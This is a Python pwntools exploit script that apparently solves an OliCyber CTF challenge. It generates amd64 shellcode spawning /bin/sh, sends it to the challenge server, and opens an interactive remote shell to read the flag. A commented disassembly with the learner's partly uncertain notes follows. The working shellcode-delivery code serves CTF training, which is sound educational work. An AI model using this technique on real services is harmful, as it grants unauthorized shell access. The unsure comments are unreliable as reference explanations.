#!/usr/bin/env python3

# This ctf goal is to build code on-the-fly thanks to the shellcraft.
# We'll be asked to send the exact size in bytes of the shellcode we wanna send.
# This can be obtained by sending the shellcode once with context.log_level activated.
# Once we know the exact size we can obtain the assembly code with line 24.
# Once we've assembly code we can assemble it to obtain an assembly/byte sequence.
# This particular sequence will open /bin/sh on the remote binary.
# Once the shell is up,we go in interactive mode and we can execute whatever command we want to.
# We'll execute cat on the flag file to obtain the file content.

from pwn import *
context.log_level = "debug"

def main():
    '''
    remote(hostname, port) apre una socket e ritorna un object
    che può essere usato per inviare e ricevere dati sulla socket  
    '''
    
    HOST = "software-20.challs.olicyber.it"
    PORT = 13003
    r = remote(HOST,PORT) # If so it means we wanna connect to the remote server
    r.sendlineafter(b"... Invia un qualsiasi carattere per iniziare ...",b"a")
    asm_code = shellcraft.amd64.linux.sh()
    shellcode = asm(asm_code, arch='x86_64')
    r.sendlineafter(b"Shellcode size (max 4096): ","49")
    r.sendline(shellcode)
    r.interactive()
    r.recv()
    r.close()

if __name__ == "__main__":
    main()


     #
     # /* execve(path='/bin///sh', argv=['sh'], envp=0) */
     #    /* push b'/bin///sh\x00' */
     #    push 0x68 --> push 0x68 to stack (equivalent of 104 int)
     #    mov rax, 0x732f2f2f6e69622f --> Assign this address to the rax register
     #    push rax -> puts rax onto the stack --> 0x732f2f2f6e69622f 
     #    mov rdi, rsp --> copy rsp register onto the rdi register 

     #    /* push argument array ['sh\x00'] */
     #    /* push b'sh\x00' */
     #    push 0x1010101 ^ 0x6873 --> Push xor'ed value (1016972)
     #    xor dword ptr [rsp], 0x1010101 --> xor operation between ptr of rsp and 0x1010101
     #    xor esi, esi /* 0 */ -> little trick to clear register esi and set it to 0
     #    push rsi /* null terminate */ 
     #    push 8 --> ??
     #    pop rsi  --> removes item at the top of stack and put into rsi, decreasing the stack pointer to point to the preceding item.
     #    add rsi, rsp --> add  rsi to rsp
     #    push rsi /* 'sh\x00' */ --> push rsi onto the stack
     #    mov rsi, rsp copy rsp to rsi
     #    xor edx, edx /* 0 */ clear edx register by setting it to 0
     #    /* call execve() */ 
     #    push 59 /* 0x3b */ ??
     #    pop rax pop the first item of the stack and puts it onto rax
     #    syscall syscall??
     #
